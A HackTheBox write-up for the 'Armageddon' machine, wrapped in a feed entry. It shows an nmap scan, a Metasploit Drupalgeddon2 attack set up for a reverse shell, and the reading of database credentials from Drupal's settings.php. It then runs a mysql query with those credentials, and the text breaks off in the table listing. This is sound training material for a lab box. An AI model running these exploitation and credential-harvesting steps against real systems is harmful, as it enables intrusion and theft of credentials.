            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Armageddon Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/armageddon/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/armageddon/</id>
            <updated>2021-07-24T19:03:42&#43;03:00</updated>
            <published>2021-07-24T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Armageddon Writeup (HackTheBox) Overview Machine: https://www.hackthebox.eu/home/machines/profile/323 Armageddon is an Easy HackTheBox machine created by bertolis ( HTB Profile: https://www.hackthebox.eu/home/users/profile/27897). We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box.</summary>
            
                <content type="html">&lt;h1 id=&#34;armageddon-writeup-hackthebox&#34;&gt;Armageddon Writeup (HackTheBox)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/1.png&#34; alt=&#34;Pasted image 20210724044016.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/323&#34;&gt;https://www.hackthebox.eu/home/machines/profile/323&lt;/a&gt;
Armageddon is an Easy HackTheBox machine created by &lt;strong&gt;bertolis&lt;/strong&gt; ( HTB Profile: &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27897)&#34;&gt;https://www.hackthebox.eu/home/users/profile/27897)&lt;/a&gt;. We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box. From there, the database credentials used by Drupal are discovered, letting us connect to the mysql database and get another user&amp;rsquo;s credentials. We later discover this user can install snap packages with sudo. Exploiting this, we create a new user on the system by installing a custom .snap file. The new user has the permission to run everything with sudo, giving us the ability to change to the root user.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sC -sV 10.10.10.233 -oA armageddon
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-07-24 04:49 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.233
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.089s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Drupal &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; disallowed entries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; shown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /includes/ /misc/ /modules/ /profiles/ /scripts/ 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/LICENSE.txt /MAINTAINERS.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Welcome to  Armageddon &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Armageddon
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 12.80 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;-oN: Save the nmap output on the designated file in normal format.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;port-80&#34;&gt;Port 80&lt;/h1&gt;
&lt;p&gt;From our initial nmap scan we can see that an HTTP server is running on port 80. By visiting the page we see the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/2.png&#34; alt=&#34;Pasted image 20210724045345.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;By using the Wappalyzer addon for firefox (which we can get here: &lt;a href=&#34;https://addons.mozilla.org/el/firefox/addon/wappalyzer/&#34;&gt;https://addons.mozilla.org/el/firefox/addon/wappalyzer/&lt;/a&gt;) we can see right away, that the server is using &lt;strong&gt;Drupal&lt;/strong&gt; version 7, which is a free and open-source Content Management System (CMS). In case we did not have the wappalyzer addon we could still identify that this is a Drupal installation from the page source:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/3.png&#34; alt=&#34;Pasted image 20210724050301.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;At this point, we could try some default credentials or try brute forcing our way in (of course this could potentially lock out a user or/and blacklist our IP so always use with caution). We could also create a new user and try to log in. Since these paths did not appear to work, the next step is to search about Drupal version 7, in order to possibly identify any vulnerability/exploit. Simply searching for &amp;ldquo;Drupal 7 exploit&amp;rdquo; returns a lot of results. The very first interesting result appears to be the known Drupalgeddon2 exploit (&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;https://github.com/dreadlocked/Drupalgeddon2&lt;/a&gt;). If we ignore the fact that the box&amp;rsquo;s name is Armageddon (kinda sounds like Drupalgeddon) which pushes us to believe that it is the right exploit, we would try this exploit anyway since it seems to affect the following versions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Drupal &lt;strong&gt;&amp;lt; 8.3.9&lt;/strong&gt; / &lt;strong&gt;&amp;lt; 8.4.6&lt;/strong&gt; / &lt;strong&gt;&amp;lt; 8.5.1&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Drupal &lt;strong&gt;&amp;lt; 7.58&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;which includes our version.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;getting-a-shell-as-apache&#34;&gt;Getting a shell as apache&lt;/h1&gt;
&lt;p&gt;The exploit we found out is already included in the Metasploit Framework and we are gonna use it from there. Searching for &amp;ldquo;Drupal&amp;rdquo; we can find it pretty easily:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/4.png&#34; alt=&#34;Pasted image 20210724051448.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The process of the exploitation is pretty straightforward at this point. After selecting the correct exploit from our search we are going to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;set rhosts 10.10.10.233&lt;/code&gt;: Declare our target.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set lhost tun0&lt;/code&gt;: Set our tun0 interface in order for the reverse shell to connect to the right IP.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;run&lt;/code&gt;: run the exploit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/5.png&#34; alt=&#34;Pasted image 20210724052103.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We now have a meterpreter shell as the apache user.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;escalating-privileges-to-the-user-brucetherealadmin&#34;&gt;Escalating privileges to the user brucetherealadmin&lt;/h1&gt;
&lt;p&gt;Since we got a shell as &lt;strong&gt;apache&lt;/strong&gt;, which is a not very privileged user, we will need to escalate our privileges to a normal user. Simply using &lt;code&gt;ls -la&lt;/code&gt; we can see that we can read the server files, including the Drupal installation files:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/6.png&#34; alt=&#34;Pasted image 20210724053454.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It should be mentioned here that in order for Drupal to work, you have to tell Drupal where it will find the database, what the name of the database is, and what are the database credentials in order to access it. All these information are stored in a file called &lt;code&gt;settings.php&lt;/code&gt;. Since we can read the Drupal installation files as the apache user, we can also read this file. Even if we do not know the exact location of this file, a simple Google search for &amp;ldquo;drupal credentials file&amp;rdquo; can do the job (&lt;a href=&#34;https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored)&#34;&gt;https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored)&lt;/a&gt;. From this Drupal forum we can see that the file we want is located at &lt;strong&gt;/sites/default/settings.php&lt;/strong&gt;, which we of cource have access to. Reading the file we can start searching for the database credentials stored inside it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/7.png&#34; alt=&#34;Pasted image 20210724054732.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We now have a set of credentials for the mysql database. We can also verify that the target does indeed listen to the mysql port:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/8.png&#34; alt=&#34;Pasted image 20210724072328.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This means we can log in mysql to possibly find more credentials. Since we already know from the file that we have the database&amp;rsquo;s name is drupal we are going to run the following in order to see the tables in it (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;show tables;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tables_in_drupal
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;actions
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;authmap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;batch
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;block
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;block_custom
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;block_node_type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;block_role
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;blocked_ips
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_block
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_bootstrap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_field
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_filter
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_form
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_image
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_menu
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_page
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cache_path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;comment
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;date_format_locale
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;date_format_type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;date_formats
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_config
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_config_instance
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_data_body
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_data_comment_body
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_data_field_image
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_data_field_tags
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_revision_body
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_revision_comment_body
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_revision_field_image
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;field_revision_field_tags
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;file_managed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;file_usage
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filter
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filter_format
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flood
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;image_effects
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;image_styles
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;menu_custom
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;menu_links
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;menu_router
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node_access
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node_comment_statistics
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node_revision
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node_type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;queue
